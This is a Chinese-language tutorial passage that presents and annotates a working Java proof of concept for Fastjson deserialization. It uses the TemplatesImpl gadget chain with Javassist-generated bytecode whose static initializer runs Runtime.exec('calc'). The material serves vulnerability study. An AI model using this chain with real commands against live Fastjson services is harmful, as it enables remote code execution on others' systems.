

这里先给出一个POC，先基于这个进行分析，之后再用一个demo模拟业务场景。



```java

package org.apache.maven.archetypes;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import java.util.Base64;

public class Main {
    public static class test{
    }

    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get(test.class.getName());                    //cc成为了test类的副本，之后铺的修改都围绕着这个副本

        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";

        cc.makeClassInitializer().insertBefore(cmd);                      //把cmd这个放到cc的static代码块中了，只要cc类被加载就会触发

        String randomClassName = "W01fh4cker" + System.nanoTime();      //因为 JVM 的规则：同一个 ClassLoader 下，同一个类名只能加载一次
        cc.setName(randomClassName);                                   //所以每次都换名

        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
        //getName()获取类的全名字符串com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet
        //pool.get从 Javassist 的 ClassPool 里取出这个类，返回 AbstractTranslet 的 CtClass 对象（可编辑的类模板）
        //.setSuperclass() 设置cc的父类为 AbstractTranslet




        //---------------上部分生成了恶意类-----------------------

        //---------------下部分是恶意代码的反序列化，执行------------
        try {
            byte[] evilCode = cc.toBytecode();//直接生成cc类的字节码，就是.class
            String evilCode_base64 = Base64.getEncoder().encodeToString(evilCode);//编码字节码为base64
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";//定义一个常量，存 TemplatesImpl 的完整类名
            String text1 = "{"+                     //text1都是TemplatesImpl所需要的
                    "\"@type\":\"" + NASTY_CLASS +"\","+
                    "\"_bytecodes\":[\""+evilCode_base64+"\"],"+
                    "'_name':'W01h4cker',"+
                    "'_tfactory':{ },"+             //避免空指针
                    "'_outputProperties':{ }"+      //这一步是触发jvm中加载好的类以触发static代码块
                    "}\n";
            ParserConfig config = new ParserConfig();//new 一个新默认配置，不受全局fastjson配置影响

            //Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
            //实际上只要这两个参数就行了
            // TemplatesImpl 链需要 Feature.SupportNonPublicField，因为 _bytecodes 是 private 字段
            Object obj = JSON.parseObject(text1, Feature.SupportNonPublicField);

            //开始反序列化，执行static代码块
            //正常来说用户控制输入的地方只有text1，这个json字段
            //Object.class，返回类型，Object.class指可返回任意类型
            //config，解析器设置，上面的new ParserConfig() 新默认配置
            //Feature.SupportNonPublicField，允许 FastJSON 通过反射设置 private 字段，_bytecodes 是 private，
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

这里一步步进行调试，接下来会以源码+注释的形式解释
